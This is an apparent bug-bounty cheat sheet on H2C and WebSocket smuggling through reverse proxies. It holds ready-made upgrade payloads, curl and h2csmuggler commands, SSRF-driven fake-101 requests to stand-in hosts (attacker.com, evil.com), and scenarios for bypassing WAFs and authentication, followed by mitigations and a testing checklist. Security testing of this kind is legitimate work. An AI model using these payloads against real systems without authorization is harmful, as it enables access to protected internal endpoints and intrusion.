## 1. Overview (Theory)

**H2C (HTTP/2 Cleartext)** is a protocol upgrade mechanism that converts a standard HTTP/1.1 connection into a persistent HTTP/2 binary connection without TLS encryption.

### How It Works

- Client sends special headers requesting an upgrade to H2C
- Reverse proxy forwards the request
- Backend accepts upgrade and switches to HTTP/2 binary protocol
- **Critical**: Once upgraded, the proxy stops inspecting individual requests—it just passes raw data

### Why This Matters for Bug Bounty

When you establish an H2C tunnel through a reverse proxy:

- ✅ Bypass WAF rules
- ✅ Bypass authentication checks
- ✅ Bypass path-based routing restrictions
- ✅ Access internal APIs hidden behind the proxy
- ✅ Reach endpoints that should be blocked

**Key Point**: The proxy thinks it's just maintaining a persistent connection, but you're actually tunneling HTTP/2 requests that never get inspected.

---

## 2. Exploitation Methods

### Standard H2C Smuggling

**Required Headers (RFC Compliant)**:

```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

**Non-Compliant Variant** (works on some backends):

```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
Connection: Upgrade
```

### Step-by-Step Exploitation

**Step 1: Identify Vulnerable Proxies**

**Inherently Vulnerable** (auto-forward upgrade headers):

- HAProxy
- Traefik
- Nuster

**Configurable** (vulnerable if misconfigured):

- AWS ALB/CLB
- NGINX
- Apache
- Squid
- Varnish
- Kong
- Envoy
- Apache Traffic Server

**Step 2: Test for H2C Support**

Send upgrade request and check response:

```bash
curl -i -X GET https://target.com/ \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
  -H "Connection: Upgrade, HTTP2-Settings"
```

**Success indicators**:

- `HTTP/1.1 101 Switching Protocols`
- `Connection: Upgrade`
- `Upgrade: h2c`

**Step 3: Use Automated Tools**

**BishopFox h2csmuggler**:

```bash
# Install
git clone https://github.com/BishopFox/h2csmuggler
cd h2csmuggler
pip3 install -r requirements.txt

# Basic scan
python3 h2csmuggler.py -x https://target.com/

# Access internal endpoint
python3 h2csmuggler.py -x https://target.com/ --upgrade-only -H "X-Custom: header"
```

**Assetnote h2csmuggler**:

```bash
# Install
go install github.com/assetnote/h2csmuggler@latest

# Scan
h2csmuggler -u https://target.com/
```

**Step 4: Exploit the Tunnel**

Once H2C connection established:

1. Send HTTP/2 frames directly to backend
2. Access internal paths not exposed by proxy
3. Bypass authentication/WAF on subsequent requests

**Critical Discovery**: Even if `proxy_pass` specifies a path like `http://backend:9999/socket.io`, the H2C connection opens to `http://backend:9999/` — meaning you can access **any path** on that backend.

---

## 3. WebSocket Smuggling

Similar concept but uses WebSocket upgrade instead of H2C.

### Scenario 1: Invalid Protocol Version

**Target**: Backend with public WebSocket + private REST API

**Attack Flow**:

1. Send upgrade with **wrong** `Sec-WebSocket-Version`
2. Proxy forwards without validation
3. Backend rejects with `426 Upgrade Required`
4. Proxy ignores 426, thinks upgrade succeeded
5. Connection stays open → raw TCP access to private API

**Payload**:

```http
GET /websocket HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 99
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
```

**Vulnerable Proxies**:

- Varnish (won't fix)
- Envoy ≤ 1.8.0

**Exploitation**:

```bash
# After sending bad upgrade, connection remains open
# Send raw HTTP requests:
POST /internal/api/admin HTTP/1.1
Host: backend
Content-Length: 0

```

### Scenario 2: SSRF + Status Code 101

**Target**: Backend with health check API that can trigger external requests

**Attack Flow**:

1. Send POST to health check with `Upgrade: websocket` header
2. Health check fetches attacker-controlled URL
3. Attacker returns `HTTP/1.1 101 Switching Protocols`
4. Backend forwards 101 to proxy
5. Proxy sees 101, thinks WebSocket established
6. Connection stays open → access private REST API

**Payload**:

```http
POST /health-check HTTP/1.1
Host: target.com
Upgrade: websocket
Content-Type: application/json
Content-Length: 50

{"url": "http://attacker.com/fake-101-response"}
```

**Attacker Server Response**:

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade

```

**Vulnerable**: Most reverse proxies if SSRF exists

---

## 4. Key Payloads

### RFC-Compliant H2C Upgrade

```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

### Non-Compliant H2C (Lenient Backends)

```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
Connection: Upgrade
```

### WebSocket Smuggling (Invalid Version)

```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 99
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
```

### WebSocket Smuggling (SSRF-Based)

```http
POST /api/check HTTP/1.1
Host: target.com
Upgrade: websocket
Content-Type: application/json

{"target": "http://evil.com/return-101"}
```

### NGINX H2C Bypass (Path Restriction)

```http
GET /allowed-path HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings

[After upgrade, access any path on backend:]
:method: GET
:path: /admin/secret
:authority: backend
```

---

## 5. High-Impact Scenarios

### 🎯 Bypass WAF to Exploit SQLi/XSS

- Establish H2C tunnel
- Send malicious payloads through tunnel
- WAF never inspects them

### 🎯 Access Admin Panels

- Proxy blocks `/admin/*` paths
- Upgrade to H2C on allowed path
- Send requests to `/admin/` through tunnel

### 🎯 Internal API Exploitation

- Backend has private APIs (health, metrics, debug)
- Only accessible from localhost
- H2C tunnel = direct backend access = reach internal endpoints

### 🎯 Authentication Bypass

- Proxy enforces JWT/session validation
- Upgraded connection bypasses proxy logic
- Send unauthenticated requests directly to backend

### 🎯 SSRF via WebSocket Smuggling

- Combine with health check APIs
- Trigger internal requests via smuggled connection
- Pivot to internal network

---

## 6. Mitigations

### For Defenders

**Reverse Proxy Level**:

- ✅ Strip or validate `Upgrade` and `Connection` headers
- ✅ Explicitly deny `Upgrade: h2c` if not needed
- ✅ Validate WebSocket upgrade responses (check status code + headers)
- ✅ Never forward `Upgrade` header unless WebSocket is intentionally supported

**NGINX Specific**:

```nginx
# Remove upgrade headers
proxy_set_header Upgrade "";
proxy_set_header Connection "";

# Or explicitly allow only WebSocket
if ($http_upgrade != "websocket") {
    set $http_upgrade "";
}
```

**Backend Level**:

- ✅ Reject unexpected protocol upgrades
- ✅ Validate `Sec-WebSocket-Version` strictly
- ✅ Don't reflect external content in upgrade responses

**Application Level**:

- ✅ Implement authentication/authorization at backend (don't rely on proxy alone)
- ✅ Rate-limit upgrade attempts
- ✅ Log and monitor upgrade requests

---

## Testing Checklist

- [ ] Send compliant H2C upgrade request
- [ ] Send non-compliant H2C upgrade (no HTTP2-Settings in Connection)
- [ ] Test WebSocket upgrade with invalid version
- [ ] Check if health/check endpoints exist
- [ ] Test SSRF via health check + fake 101 response
- [ ] Map internal endpoints accessible after upgrade
- [ ] Test with tools: h2csmuggler (BishopFox + Assetnote)
- [ ] Check proxy type (HAProxy/Traefik = high chance)
- [ ] Try accessing `/admin`, `/internal`, `/metrics` via tunnel

---

## References & Labs

**Tools**:

- https://github.com/BishopFox/h2csmuggler
- https://github.com/assetnote/h2csmuggler

**WebSocket Smuggling Labs**:

- https://github.com/0ang3el/websocket-smuggle

**Deep Dives**:

- https://blog.assetnote.io/2021/03/18/h2c-smuggling/
- https://bishopfox.com/blog/h2c-smuggling-request